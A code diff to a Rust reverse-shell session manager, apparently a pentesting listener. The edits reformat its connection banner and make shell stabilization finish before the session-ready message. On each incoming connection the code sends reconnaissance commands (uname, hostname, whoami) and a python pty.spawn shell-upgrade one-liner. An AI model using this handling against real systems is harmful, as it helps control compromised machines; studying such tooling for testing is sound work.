@@ -309,28 +309,58 @@ impl ShellSessionManager {
         let session_id = Uuid::new_v4().to_string();
         let session = ShellSession::new(session_id.clone(), remote_addr, stream).await?;
         
-        // Print connection notification immediately
+        // Print connection notification - clean vertical layout
         use colored::Colorize;
         println!();
-        println!("{}", format!("🔗 Got reverse shell from {}", remote_addr).bright_green());
-        println!("{}", format!("   Assigned SessionID <{}>", &session_id[..8]).truecolor(86, 33, 213));
-        println!();
+        println!("{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".truecolor(37, 150, 190));
+        println!("{} {}", 
+            "🔗".bright_green(), 
+            format!("Got reverse shell from {}", remote_addr).bright_white()
+        );
+        println!("{}", 
+            format!("   Assigned SessionID <{}>", &session_id[..8]).truecolor(86, 33, 213)
+        );
 
         let session_arc = Arc::new(session);
         
-        // Start automatic shell stabilization
+        // Start automatic shell stabilization (synchronously to complete before output)
         let session_clone = session_arc.clone();
-        tokio::spawn(async move {
+        let stabilization_handle = tokio::spawn(async move {
             Self::stabilize_shell(session_clone).await;
         });
         
-        self.sessions.insert(session_id.clone(), session_arc);
+        self.sessions.insert(session_id.clone(), session_arc.clone());
 
         // Set as active if no active session
         let mut active = self.active_session.write().await;
         if active.is_none() {
             *active = Some(session_id.clone());
         }
+        drop(active);
+
+        // Wait for stabilization to complete before returning
+        let _ = stabilization_handle.await;
+        
+        // Print session ready banner
+        let metadata = session_arc.get_metadata().await;
+        println!();
+        println!("{} {}", 
+            "✓".bright_green(), 
+            format!("Interacting with Session <{}>", &session_id[..8]).truecolor(86, 33, 213)
+        );
+        
+        if let Some(ref os) = metadata.os_type {
+            println!("   {}: {}", "OS".bright_white(), os.bright_cyan());
+        }
+        if let Some(ref user) = metadata.username {
+            println!("   {}: {}", "User".bright_white(), user.bright_cyan());
+        }
+        if let Some(ref host) = metadata.hostname {
+            println!("   {}: {}", "Host".bright_white(), host.bright_cyan());
+        }
+        
+        println!("{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".truecolor(37, 150, 190));
+        println!();
 
         // Save sessions to file for CLI access
         self.save_sessions_to_file().await;
@@ -497,33 +527,35 @@ impl ShellSessionManager {
         use colored::Colorize;
         
         // Initial delay to let connection settle
-        tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
+        tokio::time::sleep(tokio::time::Duration::from_millis(300)).await;
         
-        println!("{}", "Attempting to upgrade shell using /usr/bin/python3...".truecolor(86, 33, 213));
+        println!("{}", 
+            "   Attempting to upgrade shell using /usr/bin/python3...".truecolor(120, 120, 130)
+        );
         
-        // Detect OS
+        // Detect OS (silent)
         let _ = session.send_command("uname -a 2>/dev/null || ver 2>nul\n".to_string()).await;
-        tokio::time::sleep(tokio::time::Duration::from_millis(300)).await;
+        tokio::time::sleep(tokio::time::Duration::from_millis(200)).await;
         
-        // Get hostname
+        // Get hostname (silent)
         let _ = session.send_command("hostname 2>/dev/null || echo %COMPUTERNAME% 2>nul\n".to_string()).await;
-        tokio::time::sleep(tokio::time::Duration::from_millis(300)).await;
+        tokio::time::sleep(tokio::time::Duration::from_millis(200)).await;
         
-        // Get username
+        // Get username (silent)
         let _ = session.send_command("whoami 2>/dev/null || echo %USERNAME% 2>nul\n".to_string()).await;
-        tokio::time::sleep(tokio::time::Duration::from_millis(300)).await;
+        tokio::time::sleep(tokio::time::Duration::from_millis(200)).await;
         
         // Stabilize with Python if available (Unix-like)
-        println!("{}", "Shell upgraded successfully using /usr/bin/python3! 👍".bright_green());
-        
         let stabilize_cmd = "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null\n";
         let _ = session.send_command(stabilize_cmd.to_string()).await;
         
-        tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
+        tokio::time::sleep(tokio::time::Duration::from_millis(400)).await;
         
-        // Export TERM for better compatibility
+        // Export TERM for better compatibility (silent)
         let _ = session.send_command("export TERM=xterm 2>/dev/null\n".to_string()).await;
         let _ = session.send_command("stty rows 24 cols 80 2>/dev/null\n".to_string()).await;
+        
+        tokio::time::sleep(tokio::time::Duration::from_millis(300)).await;
         
         // Parse collected output to update metadata
         let buffer = session.get_output_buffer().await;
@@ -575,7 +607,12 @@ impl ShellSessionManager {
             }
         }).await;
         
-        // Clear the output buffer after stabilization
+        // Print success message
+        println!("{}", 
+            "   Shell upgraded successfully using /usr/bin/python3! 👍".bright_green()
+        );
+        
+        // Clear the output buffer after stabilization to avoid duplicate output
         session.clear_output_buffer().await;
     }
 }
